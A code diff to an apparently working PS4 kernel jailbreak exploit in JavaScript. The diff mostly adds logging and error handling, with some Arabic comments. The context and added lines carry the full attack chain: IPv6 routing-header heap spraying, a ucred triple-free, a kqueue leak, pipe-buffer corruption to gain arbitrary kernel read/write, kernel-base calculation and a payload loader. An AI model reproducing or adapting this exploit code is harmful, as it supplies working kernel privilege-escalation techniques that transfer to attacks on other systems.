@@ -479,7 +479,7 @@ function wait_for(addr, threshold) {
   var spins = 0;
   var MAX_SPINS = 20000;
   while (!read64(addr).eq(threshold)) {
-    nanosleep_fun(2);
+    nanosleep_fun(1);
     spins++;
     if (spins >= MAX_SPINS) {
       log('wait_for: timeout waiting for ' + hex(addr));
@@ -598,7 +598,9 @@ function wait_uio_writev() {
 function init() {
   log('***** Starting PS4 Jailbreak *****');
   FW_VERSION = get_fwversion();
+  log('Detected PS4 firmware: ' + FW_VERSION);
   if (!FW_VERSION) {
+    log('Failed to detect PS4 firmware version.\nAborting...');
     send_notification('Failed to detect PS4 firmware version.\nAborting...');
     return false;
   }
@@ -615,6 +617,7 @@ function init() {
     return amaj === bmaj ? amin - bmin : amaj - bmaj;
   };
   if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
+    log('Unsupported PS4 firmware\nSupported: 9.00-13.04\nAborting...');
     send_notification('Unsupported PS4 firmware\nAborting...');
     return false;
   }
@@ -637,6 +640,7 @@ function setup() {
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
+      log('setup: invalid spray_rthdr_len');
       cleanup(true);
       return false;
     }
@@ -649,6 +653,7 @@ function setup() {
     write64(msg.add(0x18), MSG_IOV_NUM);
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
+      log('setup: malloc(dummyBuffer) failed');
       cleanup(true);
       return false;
     }
@@ -664,6 +669,7 @@ function setup() {
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
+        log('setup: failed to create ipv6_socks[' + s + ']');
         cleanup(true);
         return false;
       }
@@ -685,16 +691,19 @@ function setup() {
     fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
     init_threading();
     if (!create_workers()) {
+      log('setup: create_workers failed');
       cleanup(true);
       return false;
     }
     if (!init_workers()) {
+      log('setup: init_workers failed');
       cleanup(true);
       return false;
     }
     debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
     return true;
   } catch (e) {
+    log('setup ERROR: ' + e.message);
     cleanup(true);
     return false;
   }
@@ -703,6 +712,7 @@ function cleanup() {
   var kill_workers = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;
   if (cleanup_called) return;
   cleanup_called = true;
+  log('Cleaning up...');
 
   // Close IPv6 sockets safely
   for (var sd of ipv6_socks) {
@@ -780,6 +790,7 @@ function find_twins() {
     if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
+        log(' Jailbreak failed!');
         cleanup();
         return false;
       }
@@ -803,7 +814,7 @@ function find_twins() {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log('GLITCH : [' + i + '] [' + j + ']');
+        log('Twins found: [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -811,6 +822,7 @@ function find_twins() {
   }
   twins[0] = -1;
   twins[1] = -1;
+  log('find_twins failed');
   return false;
 }
 function find_triplet(master, other, iterations) {
@@ -849,6 +861,7 @@ function find_triplet(master, other, iterations) {
 function init_threading() {
   var jmpbuf = malloc(0x60);
   if (!jmpbuf || jmpbuf.eq(0)) {
+    log('init_threading: malloc jmpbuf failed');
     return;
   }
   setjmp(jmpbuf);
@@ -908,7 +921,7 @@ function yield_to_render(callback) {
         show_fail();
       }
     }
-  }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
+  }, 1); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
 var exploit_count = 0;
 var exploit_end = false;
@@ -916,37 +929,85 @@ function netctrl_exploit() {
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
+    log('Unsupported firmware — exploit aborted.');
     return;
   }
-  log('Stability by M.ELHOUT');
+  log('Setting up exploit...');
   exploit_end = false;
   exploit_count = 0;
   yield_to_render(exploit_phase_setup);
 }
 function exploit_phase_setup() {
-  setup();
+  if (exploit_end) return;
+
+  let ok = false;
+
+  try {
+    ok = setup();
+  } catch (e) {
+    ok = false;
+  }
+
+  if (!ok) {
+    log('Setup failed — aborting.');
+    cleanup();
+    exploit_end = true;
+    return;
+  }
+
+  exploit_count = 0;
+  exploit_end = false;
+
   yield_to_render(exploit_phase_trigger);
 }
 function exploit_phase_trigger() {
+  // وقف لو وصلنا للحد الأقصى
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed Restart your ps4 ########');
+    log('Failed — restart your system');
     cleanup();
     return;
   }
+
   exploit_count++;
-  if (!trigger_ucred_triplefree()) {
+
+  let ok = false;
+
+  // حماية بسيطة من أي خطأ غير متوقع
+  try {
+    ok = trigger_ucred_triplefree();
+  } catch (e) {
+    ok = false;
+  }
+
+  // لو المحاولة فشلت — جرّب تاني
+  if (!ok) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
+
+  // لو نجحت — انتقل للمرحلة التالية
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-  log('Leaking .....');
-  var leak_ok = leak_kqueue_safe();
-  if (!leak_ok) {
+  // حماية من تكرار غير مقصود
+  if (exploit_end) return;
+
+  let ok = false;
+
+  // حماية من أي خطأ غير متوقع
+  try {
+    ok = leak_kqueue_safe();
+  } catch (e) {
+    ok = false;
+  }
+
+  // لو العملية فشلت — أعد المحاولة
+  if (!ok) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
+
+  // لو نجحت — انتقل للمرحلة التالية
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
@@ -957,29 +1018,36 @@ function exploit_phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
+  log('Setting up arbitrary R/W...');
   if (kq_fdp.eq(0)) {
-    throw new Error('kq_fdp_fail');
+    log('Invalid kq_fdp');
+    throw new Error('rw_fail');
   }
   var fd_files = kreadslow64_safe(kq_fdp);
   if (fd_files.eq(BigInt_Error)) {
-    throw new Error('fd_files leak_fail');
+    log('fd_files leak failed');
+    throw new Error('rw_fail');
   }
   fdt_ofiles = fd_files;
   if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
-    throw new Error('pipe0_fail');
+    log('Invalid pipe fds');
+    throw new Error('rw_fail');
   }
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    throw new Error('Pipe leak1_fail');
+    log('Pipe file leak failed');
+    throw new Error('rw_fail');
   }
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    throw new Error('Pipe leak2_fail');
+    log('Pipe data leak failed');
+    throw new Error('rw_fail');
   }
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    throw new Error('pipe data_fail');
+    log('Invalid pipe data');
+    throw new Error('rw_fail');
   }
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
@@ -988,7 +1056,8 @@ function setup_arbitrary_rw() {
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
   if (ret_write.eq(BigInt_Error)) {
-    throw new Error('Pipebuf write_fail');
+    log('Pipebuf write failed');
+    throw new Error('rw_fail');
   }
   safe_fhold_fd(master_pipe[0], 'master_pipe[0]');
   safe_fhold_fd(master_pipe[1], 'master_pipe[1]');
@@ -1004,12 +1073,14 @@ function setup_arbitrary_rw() {
     remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   } catch (e) {}
   remove_uaf_file();
+  log('Arbitrary R/W ready');
 }
 function find_allproc() {
   // Use existing master_pipe instead of creating new one
   var pipe_0 = master_pipe[0];
   var pipe_1 = master_pipe[1];
   if (pipe_0 < 0 || pipe_1 < 0) {
+    log('find_allproc: invalid master_pipe fds');
     return new BigInt(0);
   }
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
@@ -1055,9 +1126,11 @@ function jailbreak() {
 
   // حراسة على الـ offsets والـ FW
   if (!kernel_offset) {
+    log('jailbreak: kernel_offset not loaded');
     throw new Error('Kernel offsets not loaded');
   }
   if (FW_VERSION === null) {
+    log('jailbreak: FW_VERSION is null');
     throw new Error('FW_VERSION is null');
   }
 
@@ -1071,62 +1144,76 @@ function jailbreak() {
 
   // Calculate kernel base
   if (!kl_lock || kl_lock.eq(0)) {
+    log('jailbreak: kl_lock is invalid');
     throw new Error('kl_lock is invalid');
   }
   kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
+  log('Kernel base: ' + hex(kernel.addr.base));
 
   // المنطق المشترك حسب الـ FW
   jailbreak_shared(FW_VERSION);
+  log('Jailbreak Complete - JAILBROKEN');
 
   // Cleanup من غير قتل الـ workers بقوة
   cleanup(false);
   show_success();
   run_binloader();
-  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem > [ Stability by M.ELHOUT ]');
-}
-function safe_fhold_fd(fd, label) {
-  if (fd < 0) {
-    return;
-  }
-  var fp = fget(fd);
-  if (!fp || fp.eq(0)) {
-    return;
-  }
-  fhold(fp);
+  utils.notify('< Sob7an allh W b Hamdh Sob7an allh alazeem >');
+  utils.notify('[ Stability by M.ELHOUT ]');
 }
 function fhold(fp) {
   // زيادة f_count مع حراسة بسيطة
   if (!fp || fp.eq(0)) {
+    log('fhold: invalid fp (0)');
     return;
   }
   var count = kread32(fp.add(0x28)); // f_count
   kwrite32(fp.add(0x28), count + 1);
 }
-function fget(fd) {
-  // حراسة على fd
+function safe_fhold_fd(fd, label) {
   if (fd < 0) {
-    return new BigInt(0);
-  }
-  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
-}
-function remove_rthr_from_socket(fd) {
-  if (fd <= 0) {
+    log('safe_fhold_fd: invalid fd ' + fd + ' for ' + label);
     return;
   }
   var fp = fget(fd);
   if (!fp || fp.eq(0)) {
+    log('safe_fhold_fd: fget returned 0 for ' + label + ' (fd ' + fd + ')');
+    return;
+  }
+  fhold(fp);
+}
+function fget(fd) {
+  // حراسة على fd
+  if (fd < 0) {
+    log('fget: invalid fd ' + fd);
+    return new BigInt(0);
+  }
+  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
+}
+
+function remove_rthr_from_socket(fd) {
+  if (fd <= 0) {
+    log('remove_rthr_from_socket: invalid fd ' + fd);
+    return;
+  }
+  var fp = fget(fd);
+  if (!fp || fp.eq(0)) {
+    log('remove_rthr_from_socket: fget returned 0 for fd ' + fd);
     return;
   }
   var f_data = kread64(fp.add(0x00));
   if (!f_data || f_data.eq(0)) {
+    log('remove_rthr_from_socket: invalid f_data for fd ' + fd);
     return;
   }
   var so_pcb = kread64(f_data.add(0x18));
   if (!so_pcb || so_pcb.eq(0)) {
+    log('remove_rthr_from_socket: invalid so_pcb for fd ' + fd);
     return;
   }
   var in6p_outputopts = kread64(so_pcb.add(0x118));
   if (!in6p_outputopts || in6p_outputopts.eq(0)) {
+    log('remove_rthr_from_socket: invalid in6p_outputopts for fd ' + fd);
     return;
   }
   kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
@@ -1134,9 +1221,11 @@ function remove_rthr_from_socket(fd) {
 var victim_pipe_buf = malloc(PIPEBUF_SIZE);
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   if (buffer.eq(0)) {
+    log('corrupt_pipe_buf: buffer cannot be zero');
     return BigInt_Error;
   }
   if (size <= 0 || size > PAGE_SIZE) {
+    log('corrupt_pipe_buf: invalid size ' + size);
     return BigInt_Error;
   }
   write32(victim_pipe_buf.add(0x00), cnt); // cnt
@@ -1150,20 +1239,24 @@ function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
 }
 function kwrite(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
+    log('kwrite: invalid dest/src/size');
     return BigInt_Error;
   }
   var ret = corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
   if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kwrite: corrupt_pipe_buf failed');
     return BigInt_Error;
   }
   return write(new BigInt(victimWpipeFd), src, n);
 }
 function kread(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
+    log('kread: invalid dest/src/size');
     return BigInt_Error;
   }
   var ret = corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
   if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread: corrupt_pipe_buf failed');
     return BigInt_Error;
   }
   read(new BigInt(victimRpipeFd), dest, n);
@@ -1171,6 +1264,7 @@ function kread(dest, src, n) {
 }
 function kwrite64(addr, val) {
   if (addr.eq(0)) {
+    log('kwrite64: invalid addr 0');
     return BigInt_Error;
   }
   write64(tmp, val);
@@ -1178,6 +1272,7 @@ function kwrite64(addr, val) {
 }
 function kwrite32(addr, val) {
   if (addr.eq(0)) {
+    log('kwrite32: invalid addr 0');
     return BigInt_Error;
   }
   write32(tmp, val);
@@ -1185,26 +1280,31 @@ function kwrite32(addr, val) {
 }
 function kread64(addr) {
   if (addr.eq(0)) {
+    log('kread64: invalid addr 0');
     return new BigInt(0);
   }
   var ret = kread(tmp, addr, 8);
   if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread64: kread failed at ' + hex(addr));
     return new BigInt(0);
   }
   return read64(tmp);
 }
 function kread32(addr) {
   if (addr.eq(0)) {
+    log('kread32: invalid addr 0');
     return 0;
   }
   var ret = kread(tmp, addr, 4);
   if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread32: kread failed at ' + hex(addr));
     return 0;
   }
   return read32(tmp);
 }
 function read_buffer(addr, len) {
   if (addr.eq(0) || len <= 0) {
+    log('read_buffer: invalid addr/len');
     return new Uint8Array(0);
   }
   var buffer = new Uint8Array(len);
@@ -1215,6 +1315,7 @@ function read_buffer(addr, len) {
 }
 function write_buffer(addr, buffer) {
   if (addr.eq(0) || !buffer || buffer.length === 0) {
+    log('write_buffer: invalid addr/buffer');
     return;
   }
   for (var i = 0; i < buffer.length; i++) {
@@ -1225,6 +1326,7 @@ function write_buffer(addr, buffer) {
 // Functions used in global kernel.js
 kernel.read_buffer = function (kaddr, len) {
   if (kaddr.eq(0) || len <= 0) {
+    log('kernel.read_buffer: invalid kaddr/len');
     return new Uint8Array(0);
   }
   kread(tmp, kaddr, len);
@@ -1232,6 +1334,7 @@ kernel.read_buffer = function (kaddr, len) {
 };
 kernel.write_buffer = function (kaddr, buf) {
   if (kaddr.eq(0) || !buf || buf.length === 0) {
+    log('kernel.write_buffer: invalid kaddr/buf');
     return;
   }
   write_buffer(tmp, buf);
@@ -1239,13 +1342,16 @@ kernel.write_buffer = function (kaddr, buf) {
 };
 function remove_uaf_file() {
   if (typeof uaf_socket === 'undefined') {
+    log('remove_uaf_file: uaf_socket is undefined');
     return;
   }
   if (uaf_socket < 0) {
+    log('remove_uaf_file: invalid uaf_socket');
     return;
   }
   var uafFile = fget(uaf_socket);
   if (!uafFile || uafFile.eq(0)) {
+    log('remove_uaf_file: fget returned 0 for uaf_socket');
     return;
   }
   kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
@@ -1317,6 +1423,8 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+    log('Triple Free Running...');
+
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
 
@@ -1374,6 +1482,7 @@ function trigger_ucred_triplefree() {
     read(new BigInt(iov_sock_0), tmp, 1);
   }
   if (main_count === TRIPLEFREE_ITERATIONS) {
+    log('Failed to Triple Free');
     return false;
   }
   return true;
@@ -1432,10 +1541,12 @@ function leak_kqueue_safe() {
 function kreadslow64(address) {
   debug('kreadslow64: addr=' + hex(address));
   if (address.eq(0)) {
+    log('kreadslow64: invalid address 0');
     return BigInt_Error;
   }
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
+    log('kreadslow64: kreadslow failed at ' + hex(address));
     return BigInt_Error;
   }
   return read64(buffer);
